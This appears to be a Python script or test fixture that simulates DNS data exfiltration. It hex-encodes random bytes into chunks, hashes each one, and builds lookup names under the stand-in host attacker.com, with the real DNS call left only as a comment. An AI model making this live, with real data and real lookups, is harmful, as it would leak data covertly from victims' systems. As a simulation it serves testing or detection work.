
import time, random, os, sys

# ===== LAYER 1: Data splitting =====
import binascii as _ba

def _chunked_encode(data, chunk_size=32):
    hexed = _ba.hexlify(data).decode()
    chunks = [hexed[i:i+chunk_size] for i in range(0, len(hexed), chunk_size)]
    return chunks

# ===== LAYER 2: DNS query simulation =====
def _send_chunk(chunk):
    # Simulate DNS exfiltration
    domain = f"data.{chunk[:16]}.attacker.com"
    # In real: socket.gethostbyname(domain)
    time.sleep(random.uniform(0.02, 0.1))
    return len(domain)

# ===== LAYER 3: Encrypted channel =====
import hashlib as _h

def _encrypt_chunk(chunk, seed):
    h = _h.sha256(f"{seed}{chunk}".encode()).digest()
    return _ba.hexlify(h).decode()[:32]

def run():
    # Collect data
    collected = os.urandom(random.randint(1024, 4096))
    
    # Split into chunks
    chunks = _chunked_encode(collected)
    
    seed = int(time.time())
    
    # Exfiltrate each chunk
    total = 0
    for chunk in chunks:
        encrypted = _encrypt_chunk(chunk, seed)
        total += _send_chunk(encrypted)
    
    return total

if __name__ == "__main__":
    n = run()
    print(n)
